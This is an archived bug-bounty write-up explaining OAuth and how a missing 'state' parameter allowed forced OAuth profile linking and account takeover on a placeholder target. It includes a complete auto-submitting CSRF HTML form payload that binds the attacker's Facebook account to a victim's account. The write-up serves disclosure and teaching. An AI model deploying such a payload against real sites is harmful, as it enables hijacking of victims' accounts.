# Forced OAuth Profile Linking Lead to Account Takeover

- **Source URL:** https://medium.com/@0xtal3at/forced-oauth-profile-linking-lead-to-account-takeover-954114158818?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20241107094517/https://medium.com/@0xtal3at/forced-oauth-profile-linking-lead-to-account-takeover-954114158818
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7522 (id 7522)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ

in the name of Allah, the most gracious, the most merciful.

**Hello, awesome hackers! ,**My name is Ahmed Talaat(0xtal3at), a junior penetration tester and bug bounty hunter.

This is my first write-up on a real target. I found this with my friend [0x3adwy](https://medium.com/u/4eecf46b8cb6?source=post_page---user_mention--954114158818--------------------------------), where I’ll show you how Forced OAuth profile linking leads to an account takeover.

# What is OAuth?

OAuth is an authorization framework that allows websites and apps to request limited access to a user’s account on platforms like Google or Facebook without exposing login credentials. This lets users control the information they share and enables them to log in using their existing accounts from these providers.

# How does OAuth work?

OAuth enables secure data sharing between applications by involving three main parties:

1\. Client Application: The app or website requesting access to the user’s data.(the site you use)

2. Resource Owner: The user whose data is being accessed.

3. OAuth Service Provider: The platform (like Google or Facebook)

The OAuth process involves the **authorization code**. Here’s how it works:

- The **Client Application** (the site you use) requests permission to access the user’s data.
- The user logs into the **OAuth Service Provider** (like Google or Facebook) and approves the request.
- The **Client Application** receives an access token that allows it to access the data.
- The **Client Application** uses this token to retrieve information from the server.

# let’s get start .

We will assume the target we are testing is called `example.com` During testing of the site, I went to **test** the OAuth authentication process. I chose Facebook and clicked “Continue” to link my Facebook account to example.com

Then, I captured the request that links a user’s account with an OAuth service provider (such as Google or Facebook).

I noticed that the `state` parameter is missing. This parameter acts like a CSRF token, and if it doesn't exist in this scenario, I can conduct a CSRF attack that lead to a Forced OAuth Profile link to the victim's account.

**The request was structured as follows:**

As you can see, the data is sent in JSON format, and I encountered a problem. However, I was able to bypass the CSRF protection in JSON using a trick, which I will discuss in another write-up.

Then, I generated a CSRF payload and sent it to the victim. The proof of concept (PoC) looks like this:

```
<html>
  <body>
    <form action="https://example.com/restapi/bindThirdPart" method="POST">
      <input type="hidden" name="data" value='{
        "accessCode": "IBUPCAUTEHNTICATE",
        "code": "TOKEN Send From OAuth Service Provider",
        "redirectUri": "https://www.example.com/passport/thirdpart/facebookcallback",
        "useAccessToken": false,
        "clientInfo": {
          "clientId": "CLIENT_ID",
          "pageId": "PAGE_ID",
          "locale": "en-SA",
          "rmsToken": "TOKEN Send From OAuth Service Provider"
        },
        "head": {
          "extension": [
            {"name": "appId", "value": "VALUE"},
            {"name": "sequence", "value": "Value"}
          ]
        }
      }' />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit(); // Automatically submit the form
    </script>
  </body>
</html>
```
I sent the payload to the victim, and as a result, their account was linked to my Facebook account.

As a result, I have successfully taken over the victim’s account by logging in with my Facebook credentials, gaining access to all their information and actions.

# Conclusion

I hope you found this write-up useful and gained new insights. Wait for me, Inshallah, in another bug and another scenario. Have a nice day 🥰!

Follow me on Social Media :
